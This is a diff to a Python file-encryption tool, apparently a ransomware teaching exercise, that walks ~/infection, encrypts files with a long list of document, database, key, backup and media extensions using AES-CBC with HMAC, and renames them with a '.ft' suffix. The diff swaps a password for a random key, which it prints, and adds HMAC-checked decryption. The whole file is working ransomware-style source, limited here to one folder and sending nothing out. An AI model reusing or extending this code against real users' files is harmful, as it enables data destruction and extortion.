@@ -1,10 +1,10 @@
 import argparse
 import hashlib
-import base64
-from Crypto.Cipher import AES
-from Crypto import Random
 from sys import exit
+import hmac
 import os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 parser = argparse.ArgumentParser(description="Encrypt all files present in ~/infection")
 parser.add_argument("-v", action="store_true", help="Print the version of the program")
@@ -13,31 +13,41 @@ parser.add_argument("-s", action="store_true", help="Do not show encrypted files
 args = parser.parse_args()
 
 if not args.r and not args.v:
-	password = input("Enter the key to encrypt the files: ")
+	password = os.urandom(32)
 extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']
 
-BLOCK_SIZE = 16
 
-def pad(s):
-    pad_length = BLOCK_SIZE - len(s) % BLOCK_SIZE
-    return s + (pad_length * chr(pad_length)).encode()
+def aes_encrypt(plaintext, key):
+	iv = os.urandom(16)
+	backend = default_backend()
+	cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+	encryptor = cipher.encryptor()
+	pad_length = 16 - (len(plaintext) % 16)
+	padded_plain_text = plaintext + bytes([pad_length]) * pad_length
+	ciphertext = iv + encryptor.update(padded_plain_text) + encryptor.finalize()
+	hmac_key = key
+	hmac_value = hmac.new(hmac_key, ciphertext, hashlib.sha256).digest()
+	return hmac_value + ciphertext
 
-def unpad(s):
-    return s[:-s[-1]]
-
-def aes_encrypt(raw, key):
-	private_key = hashlib.sha256(key.encode()).digest()
-	raw = pad(raw)
-	iv = Random.new().read(AES.block_size)
-	cipher = AES.new(private_key, AES.MODE_CBC, iv)
-	return base64.b64encode(iv + cipher.encrypt(raw))
-
-def aes_decrypt(enc, key):
-	private_key = hashlib.sha256(key.encode()).digest()
-	enc = base64.b64decode(enc)
-	iv = enc[:16]
-	cipher = AES.new(private_key, AES.MODE_CBC, iv)
-	return unpad(cipher.decrypt(enc[16:]))
+def aes_decrypt(file, key):
+	backend = default_backend()
+	with open(file, 'rb') as f:
+		hmac_value = f.read(32)
+		ciphertext = f.read()
+	hmac_key = key
+	computed_hmac = hmac.new(hmac_key, ciphertext, hashlib.sha256).digest()
+	if hmac.compare_digest(hmac_value, computed_hmac):
+		iv = ciphertext[:16]
+		actual_ciphertext = ciphertext[16:]
+		cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
+		decryptor = cipher.decryptor()
+		padded_plaintext = decryptor.update(actual_ciphertext) + decryptor.finalize()
+		pad_length = padded_plaintext[-1]
+		plaintext = padded_plaintext[:-pad_length]
+		
+		return plaintext
+	else:
+		raise ValueError("Invalid key or corrupted ciphertext")
 
 def encrypt():
 	files = find_files(extensions)
@@ -53,17 +63,15 @@ def encrypt():
 			if not args.s:
 				print(file)
 			os.rename(file, file + '.ft')
-		except:
-			pass
+		except Exception as e:
+			print(e)
 
 
 def decrypt(key):
 	files = find_files((".ft"))
 	for file in files:
 		try:
-			with open(file, 'rb') as f:
-				content = f.read()
-			decrypted = aes_decrypt(content, key)
+			decrypted = aes_decrypt(file, bytes.fromhex(key))
 			if not decrypted:
 				continue
 			with open(file, 'wb') as f:
@@ -95,4 +103,4 @@ else:
 		decrypt(args.r)
 	elif not args.r:
 		encrypt()
-		print("Files encrypted with key: " + password + "\n")
+		print("Files encrypted with key: " + password.hex())
